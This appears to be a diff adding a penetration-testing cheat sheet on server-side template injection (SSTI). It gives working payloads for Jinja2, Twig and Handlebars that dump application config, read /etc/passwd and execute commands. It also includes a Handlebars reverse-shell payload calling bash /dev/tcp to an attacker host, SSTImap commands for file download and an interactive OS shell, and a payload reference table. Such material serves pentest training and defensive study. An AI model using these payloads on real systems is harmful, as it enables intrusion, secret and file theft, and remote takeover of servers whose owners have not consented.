@@ -1,0 +1,157 @@
+---
+title: "SSTI"
+---
+
+Server-Side Template Injection (SSTI) occurs when user input is embedded directly into a template that is subsequently rendered by the server. If the input reaches the template engine unsanitised, the engine executes it as code during rendering.
+
+## Confirming SSTI
+
+Inject the universal test string to provoke a syntax error in any popular template engine:
+
+```
+${{<%[%'"}}%\.
+```
+
+If the application returns a server error or mangled output, the parameter is likely passed to a template engine. Follow up with arithmetic payloads to confirm execution.
+
+## Identifying the Template Engine
+
+Inject arithmetic payloads and follow the response to narrow down the engine.
+
+| Payload | Jinja2 | Twig | Notes |
+|---------|--------|------|-------|
+| `${7*7}` | `${7*7}` (not executed) | `${7*7}` (not executed) | Follow red path |
+| `{{7*7}}` | `49` | `49` | Follow green path |
+| `{{7*'7'}}` | `7777777` | `49` | Distinguishes Jinja2 from Twig |
+
+Start with `${7*7}`. If not executed, try `{{7*7}}`. If that executes, try `{{7*'7'}}` to tell Jinja2 (repeats the string) from Twig (returns 49).
+
+## Jinja2
+
+Jinja2 is used in Python web frameworks (Flask, Django). Any library already imported by the application is accessible in payloads.
+
+### Information Disclosure
+
+```python wrap
+# Dump full application config including secret keys
+{{ config.items() }}
+
+# Dump all built-in functions
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+### Local File Read
+
+```python wrap
+{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+### Remote Code Execution
+
+```python wrap
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+If `os` is not already imported, `__import__` handles it inline.
+
+## Twig
+
+Twig is the template engine for PHP. The `_self` keyword exposes limited internal information.
+
+### Information Disclosure
+
+```
+{{ _self }}
+```
+
+### Local File Read
+
+Twig itself has no file-read function, but Symfony's `file_excerpt` filter exposes one:
+
+```
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+```
+
+### Remote Code Execution
+
+```
+{{ ['id'] | filter('system') }}
+```
+
+Twig's `filter()` passes the array element as an argument to the named PHP function.
+
+## Handlebars
+
+Handlebars is a JavaScript template engine common in Node.js applications. It has a sandbox, but `this.constructor.constructor` exposes the native `Function` constructor, which evaluates arbitrary JavaScript strings and breaks out of the sandbox entirely.
+
+### Confirming SSTI
+
+```
+{{this}}
+{{this.__proto__}}
+{{this.constructor.constructor}}
+```
+
+If any of these return `[object Object]` or a function reference rather than the raw string, Handlebars is rendering the input.
+
+### Remote Code Execution
+
+Use `#with` to shift context to the Function constructor, then call it with a JavaScript string to execute:
+
+```handlebars wrap
+{{#with (this.constructor.constructor 'return process.mainModule.require("child_process").execSync("id").toString()')()}}
+  {{this}}
+{{/with}}
+```
+
+Chained form using `process.env` to confirm code execution before running commands:
+
+```handlebars wrap
+{{#with (this.constructor.constructor 'return process.env')()}}
+  {{#with (this.constructor.constructor 'return require("child_process").execSync("id").toString()')()}}
+    {{this}}
+  {{/with}}
+{{/with}}
+```
+
+Reverse shell variant:
+
+```handlebars wrap
+{{#with (this.constructor.constructor 'return require("child_process").execSync("bash -i >& /dev/tcp/$LHOST/4444 0>&1")')()}}
+  {{this}}
+{{/with}}
+```
+
+<Info>
+The payload works because Handlebars' `#with` helper shifts the block context to whatever value is passed. Passing the result of `Function('return ...')()` executes arbitrary JS and makes the result the new context, which is then printed with `{{this}}`.
+</Info>
+
+## SSTImap
+
+SSTImap automates SSTI detection and exploitation across 17 template engines.
+
+```bash wrap
+git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+pip3 install -r requirements.txt
+
+# Detect template engine and show capabilities
+python3 sstimap.py -u http://$TARGET/index.php?name=test
+
+# Download a remote file
+python3 sstimap.py -u http://$TARGET/index.php?name=test -D '/etc/passwd' './passwd'
+
+# Execute a command
+python3 sstimap.py -u http://$TARGET/index.php?name=test -S id
+
+# Interactive OS shell
+python3 sstimap.py -u http://$TARGET/index.php?name=test --os-shell
+```
+
+## Payload Reference
+
+| Engine | Info | LFI | RCE |
+|--------|------|-----|-----|
+| Jinja2 | `{{ config.items() }}` | `{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}` | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` |
+| Twig | `{{ _self }}` | `{{ "/etc/passwd"\|file_excerpt(1,-1) }}` | `{{ ['id'] \| filter('system') }}` |
+| Handlebars | `{{this.constructor.constructor}}` | n/a | `{{#with (this.constructor.constructor 'return require("child_process").execSync("id").toString()')()}}{{this}}{{/with}}` |
